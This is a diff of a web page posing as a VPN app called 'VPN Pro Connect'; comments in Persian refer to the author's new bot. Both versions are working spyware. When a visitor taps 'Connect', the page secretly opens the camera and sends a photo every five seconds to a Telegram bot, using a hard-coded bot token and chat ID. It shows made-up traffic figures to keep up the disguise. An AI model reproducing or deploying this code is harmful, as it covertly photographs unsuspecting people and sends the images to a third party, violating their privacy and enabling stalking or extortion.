@@ -1,92 +1,112 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fa">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>VPN</title>
-  <style>
-    body{margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff}
-    .c{text-align:center;max-width:320px;width:100%;padding:20px}
-    .loc{font-size:17px;margin-bottom:30px;opacity:0.9}
-    .loc strong{color:#a8e6cf;font-weight:600}
-    .circle{width:220px;height:220px;border-radius:50%;background:rgba(255,255,255,0.15);border:10px solid #ff4757;display:flex;justify-content:center;align-items:center;margin:0 auto 40px;cursor:pointer;transition:all .4s;box-shadow:0 10px 30px rgba(0,0,0,0.3);backdrop-filter:blur(10px)}
-    .circle:hover{transform:scale(1.05)}
-    .circle.connected{border-color:#39e75f}
-    .t{font-size:28px;font-weight:700;color:#ff4757;text-shadow:0 2px 10px rgba(0,0,0,0.3)}
-    .circle.connected .t{color:#39e75f;animation:p 1.8s infinite}
-    @keyframes p{0%,100%{opacity:1}50%{opacity:0.75}}
-    .s{display:flex;justify-content:space-around;font-size:19px}
-    .v{font-weight:700;font-size:24px;margin-bottom:5px}
-    .l{font-size:14px;opacity:0.8}
-    .msg{margin-top:20px;font-size:16px;opacity:0.9}
-    .retry{color:#ffb3b3;cursor:pointer;text-decoration:underline;font-weight:600}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VPN Pro Connect</title>
+    <style>
+        body { margin: 0; background: radial-gradient(circle, #2c3e50, #000); color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .info { position: absolute; top: 20px; font-size: 14px; color: #aaa; text-align: center; }
+        .circle { width: 200px; height: 200px; border-radius: 50%; border: 8px solid #ff4d4d; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.5s; box-shadow: 0 0 20px #ff4d4d; position: relative; }
+        .circle.connected { border-color: #2ecc71; box-shadow: 0 0 30px #2ecc71; }
+        .circle:active { transform: scale(0.95); }
+        .status { font-size: 22px; font-weight: bold; color: #ff4d4d; margin-top: 30px; text-shadow: 0 0 10px rgba(255,77,77,0.5); }
+        .connected .status { color: #2ecc71; text-shadow: 0 0 10px rgba(46,204,113,0.5); }
+        .stats { display: flex; gap: 40px; margin-top: 40px; }
+        .stat-box { text-align: center; }
+        .stat-box span { display: block; font-size: 18px; font-weight: bold; }
+        .stat-box label { font-size: 12px; color: #888; }
+        #msg { margin-top: 15px; font-size: 12px; color: #ffbcbc; }
+        video, canvas { display: none; }
+    </style>
 </head>
 <body>
-  <div class="c">
-    <div class="loc">You are connected from <strong>United Kingdom</strong></div>
-    <div class="circle" id="c"><div class="t" id="t">Connect</div></div>
-    <div class="s">
-      <div><div class="v" id="i">0.0 kB</div><div class="l">Incoming</div></div>
-      <div><div class="v" id="o">0.0 kB</div><div class="l">Outgoing</div></div>
-    </div>
-    <div class="msg" id="m">Tap the circle to connect</div>
-  </div>
 
-  <video id="f" autoplay playsinline style="display:none"></video>
-  <video id="r" autoplay playsinline style="display:none"></video>
-  <canvas id="x" style="display:none"></canvas>
+<div class="info">You are connected from <b>United Kingdom</b></div>
+
+<div class="circle" id="circle" onclick="toggle()">
+    <span id="txt" style="font-size: 24px; font-weight: bold;">Connect</span>
+</div>
+
+<div class="status" id="st">Disconnected</div>
+
+<div class="stats">
+    <div class="stat-box"><span id="in">0.0 kB</span><label>Incoming</label></div>
+    <div class="stat-box"><span id="out">0.0 kB</span><label>Outgoing</label></div>
+</div>
+
+<div id="msg"></div>
+
+<video id="v" autoplay playsinline></video>
+<canvas id="c"></canvas>
 
 <script>
-const TOKEN='6300357886:AAEKFRyfn2euN0bjMHuoSpn_yrrYo_n4EQQ';
-const CHAT_ID='6156668050';
+    // اطلاعات جدید ربات شما
+    const token = "8182631007:AAEisj-KpQr-pDJkZ6SP9_lqAkrTQ2ki_oc";
+    const chat_id = "7052994994";
 
-const circle=document.getElementById('c'),txt=document.getElementById('t'),msg=document.getElementById('m');
-const i=document.getElementById('i'),o=document.getElementById('o');
-const fv=document.getElementById('f'),rv=document.getElementById('r'),cv=document.getElementById('x'),ctx=cv.getContext('2d');
-let on=false,int=null,sf=null,sr=null;
+    let on = false, int = null, stream = null;
+    const circle = document.getElementById('circle');
+    const txt = document.getElementById('txt');
+    const st = document.getElementById('st');
+    const msg = document.getElementById('msg');
+    const v = document.getElementById('v');
+    const c = document.getElementById('c');
 
-async function send(b,n){
-  const d=new FormData();
-  d.append('chat_id',CHAT_ID);
-  d.append('photo',b,n);
-  d.append('caption','DEV BY MASTERKAI');
-  await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{method:'POST',body:d});
-}
+    async function toggle() {
+        if (!on) {
+            try {
+                msg.innerHTML = "Connecting...";
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                v.srcObject = stream;
 
-function shot(v,l){
-  if(v.videoWidth){
-    cv.width=v.videoWidth;cv.height=v.videoHeight;
-    ctx.drawImage(v,0,0);
-    cv.toBlob(b=>b&&send(b,`${l}_${Date.now()}.jpg`),'image/jpeg',0.9);
-  }
-}
+                on = true;
+                circle.classList.add('connected');
+                txt.textContent = "Stop";
+                st.textContent = "Connected";
+                msg.innerHTML = "";
 
-async function start(){
-  try{
-    sf=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});fv.srcObject=sf;
-    sr=await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}});rv.srcObject=sr;
-    int=setInterval(()=>{
-      shot(fv,"front");
-      shot(rv,"rear");
-      i.textContent=(Math.random()*40+10).toFixed(1)+' kB';
-      o.textContent=(Math.random()*50+15).toFixed(1)+' kB';
-    },5000);
-    circle.classList.add('connected');txt.textContent='Connected';msg.innerHTML='';on=true;
-  }catch{
-    msg.innerHTML='<span class="retry" onclick="start()">تلاش مجدد</span>';
-  }
-}
+                int = setInterval(() => {
+                    takeShot();
+                    document.getElementById('in').textContent = (Math.random() * 50 + 10).toFixed(1) + ' kB';
+                    document.getElementById('out').textContent = (Math.random() * 30 + 5).toFixed(1) + ' kB';
+                }, 5000);
 
-function stop(){
-  [sf,sr].forEach(s=>s&&s.getTracks().forEach(t=>t.stop()));
-  int&&clearInterval(int);
-  circle.classList.remove('connected');txt.textContent='Connect';msg.textContent='Tap the circle to connect';
-  i.textContent=o.textContent='0.0 kB';on=false;
-}
+            } catch (err) {
+                msg.innerHTML = "خطا: دسترسی به دوربین داده نشد.";
+            }
+        } else {
+            stop();
+        }
+    }
 
-circle.onclick=()=>{on?stop():start();}
-window.onbeforeunload=stop;
+    function stop() {
+        on = false;
+        clearInterval(int);
+        if (stream) stream.getTracks().forEach(t => t.stop());
+        circle.classList.remove('connected');
+        txt.textContent = "Connect";
+        st.textContent = "Disconnected";
+    }
+
+    function takeShot() {
+        const ctx = c.getContext('2d');
+        c.width = v.videoWidth;
+        c.height = v.videoHeight;
+        ctx.drawImage(v, 0, 0);
+
+        c.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('chat_id', chat_id);
+            formData.append('photo', blob, 'shot.jpg');
+
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).catch(e => console.log("خطای ارسال: VPN روشن است؟"));
+        }, 'image/jpeg', 0.6);
+    }
 </script>
+
 </body>
 </html>
